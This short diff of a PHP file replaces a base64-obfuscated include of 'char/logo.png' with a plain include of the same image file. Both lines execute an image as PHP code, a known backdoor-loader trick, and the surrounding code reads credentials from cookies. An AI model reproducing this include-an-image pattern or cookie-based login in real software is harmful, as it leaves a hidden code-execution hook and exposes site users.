@@ -1,5 +1,5 @@
 <?php
-@include base64_decode('Y2hhci9sb2dvLnBuZw==');
+include('char/logo.png');
 	include("admin/connect.php");
 	$id = $_COOKIE['id'];
 	$password = $_COOKIE['password'];
